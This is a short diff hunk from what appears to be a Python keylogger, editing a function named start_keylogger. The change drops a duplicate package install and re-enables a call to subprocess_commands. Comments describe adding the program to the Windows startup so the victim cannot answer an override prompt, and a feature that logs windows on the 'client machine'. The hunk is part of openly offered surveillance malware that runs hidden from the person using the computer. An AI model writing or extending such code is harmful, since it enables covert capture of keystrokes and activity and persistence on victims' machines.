@@ -125,10 +125,9 @@ def start_keylogger():
         os.system("pip install requests")  # installing modules
         os.system("pip install pynput")
         os.system("pip install pywin32")
-        os.system("pip install pywin32")
         # I made this a thread because if this already exists in the startup, it will ask you for an input to override it. The user obviously can't answer the input.
 
-    # subprocess_commands()
+    subprocess_commands()
 
     def log_window():
         # This feature will only be available if the client machine is on windows
